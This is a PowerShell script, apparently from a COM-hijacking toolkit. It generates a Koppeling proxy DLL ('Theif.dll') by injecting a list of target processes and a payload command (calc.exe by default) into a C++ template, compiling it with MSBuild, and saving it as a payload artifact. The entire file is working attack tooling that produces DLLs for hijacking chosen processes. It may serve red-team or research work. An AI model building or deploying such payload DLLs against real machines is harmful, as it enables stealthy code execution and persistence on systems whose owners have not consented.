param(
    [Parameter(Mandatory = $true)]
    [string[]]$TargetProcesses,

    [string]$PayloadCommand = 'C:\Windows\System32\calc.exe',
    [string]$TemplatePath,
    [string]$KoppelingRoot,
    [string]$OutputPath,
    [string]$MsBuildPath
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Path
. (Join-Path $scriptDirectory 'ComHijackHost.Common.ps1')

if ([string]::IsNullOrWhiteSpace($TemplatePath)) {
    $TemplatePath = Join-Path $scriptDirectory '..\assets\theif-main-template.cpp'
}
$KoppelingRoot = Resolve-ComHijackKoppelingRoot -PreferredRoot $KoppelingRoot -ScriptDirectory $scriptDirectory -RequiredRelativePath 'Theif\Theif.vcxproj' -HydrateIfMissing
$MsBuildPath = Resolve-ComHijackMsBuildPath -PreferredMsBuildPath $MsBuildPath
if ([string]::IsNullOrWhiteSpace($OutputPath)) {
    $safeName = ($TargetProcesses | ForEach-Object { $_.ToLowerInvariant().Replace('.exe', '') }) -join '-'
    $OutputPath = Join-Path $scriptDirectory ("..\artifacts\payloads\theif-{0}.dll" -f $safeName)
}

$templateText = Get-Content -LiteralPath $TemplatePath -Raw
$mainCppPath = Join-Path $KoppelingRoot 'Theif\main.cpp'
$projectPath = Join-Path $KoppelingRoot 'Theif\Theif.vcxproj'
$builtDllPath = Join-Path $KoppelingRoot 'Theif\Bin\x64\Theif.dll'
$outputDirectory = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDirectory)) {
    New-Item -ItemType Directory -Path $outputDirectory -Force | Out-Null
}

$processChecks = @($TargetProcesses | ForEach-Object {
    ('processName != L"{0}"' -f $_.ToLowerInvariant())
}) -join ' && '
$guardBlock = @"
			if ($processChecks) {
				return 0;
			}
"@

$escapedPayload = $PayloadCommand.Replace('\', '\\')
$generated = $templateText.Replace('__PROCESS_GUARD__', $guardBlock).Replace('__PAYLOAD_COMMAND__', $escapedPayload)
$original = Get-Content -LiteralPath $mainCppPath -Raw

try {
    [System.IO.File]::WriteAllText($mainCppPath, $generated, [System.Text.Encoding]::ASCII)

    $originalPath = $env:PATH
    try {
        Remove-Item Env:PATH -ErrorAction SilentlyContinue
        & $MsBuildPath $projectPath /t:Build /p:Configuration=Dyn-NetClone /p:Platform=x64 /p:PlatformToolset=v143 /p:PostBuildEventUseInBuild=false | Out-Host
        if ($LASTEXITCODE -ne 0) {
            throw 'MSBuild failed while building the Koppeling payload DLL.'
        }
    } finally {
        if ($null -eq $originalPath) {
            Remove-Item Env:PATH -ErrorAction SilentlyContinue
        } else {
            $env:PATH = $originalPath
        }
    }

    Copy-Item -LiteralPath $builtDllPath -Destination $OutputPath -Force
    Get-Item -LiteralPath $OutputPath
} finally {
    [System.IO.File]::WriteAllText($mainCppPath, $original, [System.Text.Encoding]::ASCII)
}
